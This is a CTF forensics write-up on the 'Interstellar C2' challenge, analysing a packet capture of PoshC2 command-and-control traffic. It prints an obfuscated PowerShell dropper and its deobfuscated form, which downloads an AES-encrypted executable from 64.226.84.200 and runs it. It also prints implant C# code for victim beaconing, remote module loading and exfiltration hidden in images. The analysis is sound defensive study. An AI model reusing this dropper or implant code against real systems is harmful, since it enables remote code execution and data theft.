---
title: "HTB Cyber Apocalypse CTF 2023"
categories: [Writeups]
layout: post 
---

# HTB Cyber Apocalypse CTF 2023 Writeups

## Team Placing: #44 / 6483

![](/assets/img/writeups/HTBCyberApocalypse2023/certificate.png)

## Categories
* ### Forensics
    * #### [Interstellar C2](#challenge-interstellar-c2)

-------------------------------------------------------------------------------

### Challenge: Interstellar C2
### Category: Forensics

## Description

We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?

## Walkthrough:

We're provided a packet capture file named `capture.pcapng`. Opening the file in Wireshark, we can take a look at Statistics > Conversations to get an idea of who is talking in the PCAP:

![](/assets/img/writeups/HTBCyberApocalypse2023/0.png)

Most of the packets in this capture are part of a conversation between `192.168.25.140` and `64.226.84.200`. From the challenge name and description, we know we're looking to understand some command and control (C2) traffic. So there's a good chance this is the conversation between the C2 server and the victim.

We can filter out the traffic to just show this conversation so that we reduce the noise: `ip.addr == 192.168.25.140 && ip.addr == 64.226.84.200`

![](/assets/img/writeups/HTBCyberApocalypse2023/1.png)

We can quickly see a GET request from `192.168.25.140` to `64.226.84.200` for a file named `vn84.ps1`

We can extract this file using File > Export Objects > HTTP

![](/assets/img/writeups/HTBCyberApocalypse2023/2.png)

The is an obfuscated PowerShell script that looks like this:

```powershell
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode'));  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));
${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
```

With some experience the obfuscated payload is somewhat readable, but here it is after a bit of deobfuscation:
```powershell
.("Set-iTem") ("vAriAble:qLz0so")  ( [tYpe]("System.IO.FileMode"));
&("set-VariABLE") l60Yu3  ( [tYPe]("System.Security.Cryptography.Aes"));  
.("Set-VARiaBle")  BI34  (  [TyPE]("System.Security.Cryptography.CryptoStreamMode"));  

$URL = "http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51"
$PTF = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"

Import-Module BitsTranfer
Start-BitTransfer -Source $URL -Destination $PTF

$FS = &("New-Object") ("IO.FileStream")($PTF,  ( &("ChildItem")  ("VAriablE:QLz0sO")).VALue::"Open")
$MS = .("New-Object") ("System.IO.MemoryStream");

$AES =   (&('Get-Item')  VARiaBLe:l60Yu3).VAluE::("Create").Invoke()
$AES."KeySize" = 128
$KEY = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
$IV = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
$AES."KEY" = $KEY
$AES."IV" = $IV

$CS = .("New-Object") ("System.Security.Cryptography.CryptoStream")($MS, $AES.("CreateDecryptor").Invoke(),   (&("Get-Variable")  bI34  -VaLue )::"Write");

$FS.("CopyTo").Invoke($CS)
$DECD = $MS.("ToArray").Invoke()
$CS.("Write").Invoke($DECD, 0, $DECD."Length");
$DECD | .("Set-Content") -Path "$env:temp\tmp7102591.exe" -Encoding ("Byte")

& "$env:temp\tmp7102591.exe"
```

The script downloads the file at `http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51`. It then creates a AES object with the specified key and IV and decrypts the file into the user's temp directory with the name `tmp7102591.exe`.

We can extract the encrypted binary from our PCAP like we did before with the script and rework the script a bit to decrypt the extracted file for us:
```powershell
.("Set-iTem") ("vAriAble:qLz0so")  ( [tYpe]("System.IO.FileMode"));
&("set-VariABLE") l60Yu3  ( [tYPe]("System.Security.Cryptography.Aes"));  
.("Set-VARiaBle")  BI34  (  [TyPE]("System.Security.Cryptography.CryptoStreamMode"));  

# file path to extracted file
$PTF = "C:\Users\Will\Desktop\CTFs\2023\cyber_apocalypse\forensics_interstellar_c2\94974f08-5853-41ab-938a-ae1bd86d8e51"

# Use the file extracted from the pcap instead of downloading it like the original script
$FS = &("New-Object") ("IO.FileStream")($PTF,  ( &("ChildItem")  ("VAriablE:QLz0sO")).VALue::"Open")
$MS = .("New-Object") ("System.IO.MemoryStream");

$AES =   (&('Get-Item')  VARiaBLe:l60Yu3).VAluE::("Create").Invoke()
$AES."KeySize" = 128
$KEY = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
$IV = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
$AES."KEY" = $KEY
$AES."IV" = $IV

$CS = .("New-Object") ("System.Security.Cryptography.CryptoStream")($MS, $AES.("CreateDecryptor").Invoke(),   (&("Get-Variable")  bI34  -VaLue )::"Write");

$FS.("CopyTo").Invoke($CS)
$DECD = $MS.("ToArray").Invoke()
$CS.("Write").Invoke($DECD, 0, $DECD."Length");
$DECD | .("Set-Content") -Path ".\tmp7102591.exe" -Encoding ("Byte")
```

Running the `file` command on the file reveals we're dealing with a .NET executable:
```
$ file tmp7102591.exe
tmp7102591.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

This means we can use a tool like [dotPeek](https://www.jetbrains.com/decompiler/) to decompile the binary and read the source code:

![](/assets/img/writeups/HTBCyberApocalypse2023/3.png)

We could just start analyzing the code to understand how the C2 dropper works, but I found it useful to google interesting strings such as `run-exe`, `loadmodule`, `run-dll`, and `multicmd`. Doing so reveals we're dealing with a [PoshC2](https://github.com/nettitude/PoshC2) framework [dropper](https://github.com/nettitude/PoshC2/blob/master/resources/payload-templates/dropper.cs). We can use this information to find [articles](https://blogs.keysight.com/blogs/tech/nwvs/2021/08/28/posh-c2-command-and-control) where researchers have already identified how PoshC2 traffic works. With that being said, it is also helpful to read the code so let's do that as well.

Analyzing the code for a bit, I noticed an interesting `primer` function that seemed to be doing most of the initial work:
```csharp
  private static void primer()
  {
    if (!(DateTime.ParseExact("2025-01-01", "yyyy-MM-dd", (IFormatProvider) CultureInfo.InvariantCulture) > DateTime.Now))
      return;
    Program.dfs = 0;
    string str1;
    try
    {
      str1 = WindowsIdentity.GetCurrent().Name;
    }
    catch
    {
      str1 = Environment.UserName;
    }
    if (Program.ihInteg())
      str1 += "*";
    string userDomainName = Environment.UserDomainName;
    string environmentVariable1 = Environment.GetEnvironmentVariable("COMPUTERNAME");
    string environmentVariable2 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
    int id = Process.GetCurrentProcess().Id;
    string processName = Process.GetCurrentProcess().ProcessName;
    Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
    string input = (string) null;
    string baseURL = (string) null;
    foreach (string str2 in Program.basearray)
    {
      string un = string.Format("{0};{1};{2};{3};{4};{5};1", (object) userDomainName, (object) str1, (object) environmentVariable1, (object) environmentVariable2, (object) id, (object) processName);
      string key = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
      baseURL = str2;
      string address = baseURL + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
      try
      {
        string enc = Program.GetWebRequest(Program.Encryption(key, un)).DownloadString(address);
        input = Program.Decryption(key, enc);
        break;
      }
      catch (Exception ex)
      {
        Console.WriteLine(string.Format(" > Exception {0}", (object) ex.Message));
      }
      ++Program.dfs;
    }
    string RandomURI = !string.IsNullOrEmpty(input) ? new Regex("RANDOMURI19901(.*)10991IRUMODNAR").Match(input).Groups[1].ToString() : throw new Exception();
    string stringURLS = new Regex("URLS10484390243(.*)34209348401SLRU").Match(input).Groups[1].ToString();
    string KillDate = new Regex("KILLDATE1665(.*)5661ETADLLIK").Match(input).Groups[1].ToString();
    string Sleep = new Regex("SLEEP98001(.*)10089PEELS").Match(input).Groups[1].ToString();
    string Jitter = new Regex("JITTER2025(.*)5202RETTIJ").Match(input).Groups[1].ToString();
    string Key = new Regex("NEWKEY8839394(.*)4939388YEKWEN").Match(input).Groups[1].ToString();
    string stringIMGS = new Regex("IMGS19459394(.*)49395491SGMI").Match(input).Groups[1].ToString();
    Program.ImplantCore(baseURL, RandomURI, stringURLS, KillDate, Sleep, Key, stringIMGS, Jitter);
  }
```

Essentially the function:
1. Uses a hardcoded key, `DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=`, to encrypt information about the victim computer such as the domain of the computer, the computer name, the processor architecture, etc.
2. This information is then sent in a request to `/Kettie/Emmie/Anni?Theda=Merrilee?c` in a `SessionID` cookie.
3. The server response is then decrypted using the same key as before
4. The decrypted server response is parsed using regular expressions to extract "settings" such as C2 jitter time and kill date- as well as a new key to be used for all future communication.
5. These settings are passed to a function called `ImplantCore`

Now that we have an idea of what we're looking at, we can extract the TCP stream for the URL mentioned above using tshark:
```bash
tshark -r capture.pcapng -n -q -z follow,tcp,raw,3 | xxd -r -p > stage1.txt
```
```
GET /Kettie/Emmie/Anni?Theda=Merrilee?c HTTP/1.1
Cookie: SessionID=9kx6dwfjkvpCrgA6Zr0Uyq9vv8hFR4G/1UiAtxFd/ERlJLGjlGeLrck85YBMyBfEfSpJzwZRVuiHgxSaFXbT8vdB6QqsurfO8Iaudfu0Gh8=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Host: 64.226.84.200:8080
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: Apache
Date: Thu, 09 Mar 2023 08:07:44 GMT
Content-type: text/html

qppxrMa9yssuf9512p/HahW+qjr3xrmL6nXaYDGICKTJSyFRMGGzEfcSWCrmtBetIOP7283SBrg0u3iXu5n5XxV+5VDUAixPRIw0bcobL6uCUo5N4o3EbYMXMoq8k8SNMcpjGPysTlUMecOTZ+rd2BBFqqY1bCFB5uBjp4NmgMEKo0I74wbzWZ/vMX6g9uFFXkgpKgWyGY8dGfWiECWAtzt/GT+IeHj/09cf9OW5Vw2xTToztNbC3JExIMBHmOowr673TMd4E6fnhIhH8z+trcxSWZxuyjH16/3c+4j8FSN2DEbbq1WIQHIdLJRgxHEj4TMBB5422Z4YwfyNC7GRp6ekF2spIGGWiZK2/iiqeaK7FHqMSeJuN+mQpAOuRM0u9e5k6klhDYDwwRxdvHUy/05QpS5JbLNXI7aRqa6spwgI+S5PpTI9KhBLt9a7q5OGSkBNCq2HeDN6fTpOiC8a58GoYwJqVrOxh4RKRWkYJtBG+k37rqCH+/aWc65T6eiTPLjM6hLBn/...
```

We can use [CyberChef](https://gchq.github.io/CyberChef) to decrypt the `SessionID` cookie data:

![](/assets/img/writeups/HTBCyberApocalypse2023/4.png)

Nice, that information lines up with what we expected. We can use the same CyberChef recipe to decrypt the server response:

![](/assets/img/writeups/HTBCyberApocalypse2023/5.png)

This generates more base64, so let's also decode that:

![](/assets/img/writeups/HTBCyberApocalypse2023/6.png)

And there's all of the settings I mentioned before, including our new key: `nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=`

Now we need to look into how the `ImplantCore` function works:
```csharp
private static void ImplantCore(
    string baseURL,
    string RandomURI,
    string stringURLS,
    string KillDate,
    string Sleep,
    string Key,
    string stringIMGS,
    string Jitter)
  {
    Program.UrlGen.Init(stringURLS, RandomURI, baseURL);
    Program.ImgGen.Init(stringIMGS);
    Program.pKey = Key;
    int num = 5;
    System.Text.RegularExpressions.Match match1 = new Regex("(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled).Match(Sleep);
    if (match1.Success)
      num = Program.Parse_Beacon_Time(match1.Groups["t"].Value, match1.Groups["u"].Value);
    StringWriter newOut = new StringWriter();
    Console.SetOut((TextWriter) newOut);
    ManualResetEvent manualResetEvent = new ManualResetEvent(false);
    StringBuilder stringBuilder1 = new StringBuilder();
    double result = 0.0;
    if (!double.TryParse(Jitter, NumberStyles.Any, (IFormatProvider) CultureInfo.InvariantCulture, out result))
      result = 0.2;
    while (!manualResetEvent.WaitOne(new Random().Next((int) ((double) (num * 1000) * (1.0 - result)), (int) ((double) (num * 1000) * (1.0 + result)))))
    {
      if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", (IFormatProvider) CultureInfo.InvariantCulture) < DateTime.Now)
      {
        Program.Run = false;
        manualResetEvent.Set();
      }
      else
      {
        stringBuilder1.Length = 0;
        try
        {
          string cmd = (string) null;
          string str1;
          try
          {
            cmd = Program.GetWebRequest((string) null).DownloadString(Program.UrlGen.GenerateUrl());
            str1 = Program.Decryption(Key, cmd).Replace("\0", string.Empty);
          }
          catch
          {
            continue;
          }
          if (str1.ToLower().StartsWith("multicmd"))
          {
            string str2 = str1.Replace("multicmd", "");
            string[] separator = new string[1]
            {
              "!d-3dion@LD!-d"
            };
            foreach (string input in str2.Split(separator, StringSplitOptions.RemoveEmptyEntries))
            {
              Program.taskId = input.Substring(0, 5);
              cmd = input.Substring(5, input.Length - 5);
              if (cmd.ToLower().StartsWith("exit"))
              {
                Program.Run = false;
                manualResetEvent.Set();
                break;
              }
              if (cmd.ToLower().StartsWith("loadmodule"))
              {
                Assembly.Load(Convert.FromBase64String(Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase)));
                Program.Exec(stringBuilder1.ToString(), Program.taskId, Key);
              }
              else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
              {
                Thread thread = new Thread((ThreadStart) (() => Program.rAsm(cmd)));
                Program.Exec("[+] Running background task", Program.taskId, Key);
                thread.Start();
              }
              else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
                stringBuilder1.AppendLine(Program.rAsm(cmd));
              else if (cmd.ToLower().StartsWith("beacon"))
              {
                System.Text.RegularExpressions.Match match2 = new Regex("(?<=(beacon)\\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled).Match(input);
                if (match2.Success)
                  num = Program.Parse_Beacon_Time(match2.Groups["t"].Value, match2.Groups["u"].Value);
                else
                  stringBuilder1.AppendLine(string.Format("[X] Invalid time \"{0}\"", (object) input));
                Program.Exec("Beacon set", Program.taskId, Key);
              }
              else
                Program.rAsm(string.Format("run-exe Core.Program Core {0}", (object) cmd));
              stringBuilder1.AppendLine(newOut.ToString());
              StringBuilder stringBuilder2 = newOut.GetStringBuilder();
              stringBuilder2.Remove(0, stringBuilder2.Length);
              if (stringBuilder1.Length > 2)
                Program.Exec(stringBuilder1.ToString(), Program.taskId, Key);
              stringBuilder1.Length = 0;
            }
          }
        }
        catch (NullReferenceException ex)
        {
        }
        catch (WebException ex)
        {
        }
        catch (Exception ex)
        {
          Program.Exec(string.Format("Error: {0} {1}", (object) stringBuilder1.ToString(), (object) ex), "Error", Key);
        }
        finally
        {
          stringBuilder1.AppendLine(newOut.ToString());
          StringBuilder stringBuilder3 = newOut.GetStringBuilder();
          stringBuilder3.Remove(0, stringBuilder3.Length);
          if (stringBuilder1.Length > 2)
            Program.Exec(stringBuilder1.ToString(), "99999", Key);
          stringBuilder1.Length = 0;
        }
      }
    }
  }
```

The majority of the function is just extra logic for commands such as `loadmodule` and `multicmd`, but following the flow of the function I realized the `Exec` function is always called. So let's take a look at that function:

```csharp
  public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null)
  {
    if (string.IsNullOrEmpty(key))
      key = Program.pKey;
    string cookie = Program.Encryption(key, taskId);
    byte[] imgData = Program.ImgGen.GetImgData(Convert.FromBase64String(encByte == null ? Program.Encryption(key, cmd, true) : Program.Encryption(key, (string) null, true, encByte)));
    int num = 0;
    while (num < 5)
    {
      ++num;
      try
      {
        Program.GetWebRequest(cookie).UploadData(Program.UrlGen.GenerateUrl(), imgData);
        num = 5;
      }
      catch
      {
      }
    }
  }
```

This function sends POST requests back to the C2 server with the command output. Essentially the function:
1. Creates a cookie where the value is the encrypted `taskId`
2. The command output is encrypted with AES as we've seen before, but is also gzip compressed this time as noted by the 3rd parameter being `true`
3. The base64 encoded encrypted and compressed data is then base64 decoded
4. This raw encrypted and compressed command output is passed to the `GetImgData` function
5. The image generated is then sent to the C2 server in a POST request

Let's take a look at the `ImgGen` class and `GetImgData` function to see how we can extract just the command output:
```csharp
  internal static class ImgGen
  {
    private static Random _rnd = new Random();
    private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
    private static List<string> _newImgs = new List<string>();

    internal static void Init(string stringIMGS) => Program.ImgGen._newImgs = Program.ImgGen._re.Matches(stringIMGS.Replace(",", "")).Cast<System.Text.RegularExpressions.Match>().Select<System.Text.RegularExpressions.Match, string>((Func<System.Text.RegularExpressions.Match, string>) (m => m.Value)).Where<string>((Func<string, bool>) (m => !string.IsNullOrEmpty(m))).ToList<string>();

    private static string RandomString(int length) => new string(Enumerable.Repeat<string>("...................@..........................Tyscf", length).Select<string, char>((Func<string, char>) (s => s[Program.ImgGen._rnd.Next(s.Length)])).ToArray<char>());

    internal static byte[] GetImgData(byte[] cmdoutput)
    {
      int num = 1500;
      int length = cmdoutput.Length + num;
      byte[] sourceArray = Convert.FromBase64String(Program.ImgGen._newImgs[new Random().Next(0, Program.ImgGen._newImgs.Count)]);
      byte[] bytes = Encoding.UTF8.GetBytes(Program.ImgGen.RandomString(num - sourceArray.Length));
      byte[] destinationArray = new byte[length];
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, sourceArray.Length);
      Array.Copy((Array) bytes, 0, (Array) destinationArray, sourceArray.Length, bytes.Length);
      Array.Copy((Array) cmdoutput, 0, (Array) destinationArray, sourceArray.Length + bytes.Length, cmdoutput.Length);
      return destinationArray;
    }
  }
}
```

`GetImgData` gets one of the images from the "settings" we saw all the way back in the beginning (where we got the 2nd key). It then pads this image with random data up to 1500 bytes. Finally, it appends the encrypted and compressed command output to the image.

Great, now let's go decrypt all of the command output! We can use tshark to extract the streams we're interested in:
```bash
for i in $(tshark -r capture.pcapng -Y "ip.addr==192.168.25.140 && ip.addr==64.226.84.200 && png" -T fields -e tcp.stream); 
	do tshark -r capture.pcapng -n -q -z follow,tcp,raw,$i | xxd -r -p > $i.stream; 
done
```

And then we can use Python to decrypt and decompress:
```python
import base64
from Crypto.Cipher import AES
from pathlib import Path
import re
import gzip

key = base64.b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
cipher = AES.new(key, AES.MODE_CBC)
  
streams = list(Path("./").glob("*.stream"))

for stream in streams:
    with open(stream, 'rb') as f:
        data = f.read()
    try:
        cmd_output = re.findall(b"(\x89\x50\x4e\x47\x0d\x0a\x1a\x0a.*)HTTP", data, re.DOTALL)[0][1500:]
        decrypted_output = cipher.decrypt(cmd_output)[16:]
        decompressed_output = gzip.decompress(decrypted_output)
        with open("decrypted_" + str(stream), 'wb') as f:
            f.write(decompressed_output)
    except Exception as e:
        print(stream, e)
        pass
```

Running the script produces some interesting files such as mimikatz output and a base64 encoded image. Decoding the image reveals the flag:

![](/assets/img/writeups/HTBCyberApocalypse2023/7.png)

### Flag: HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}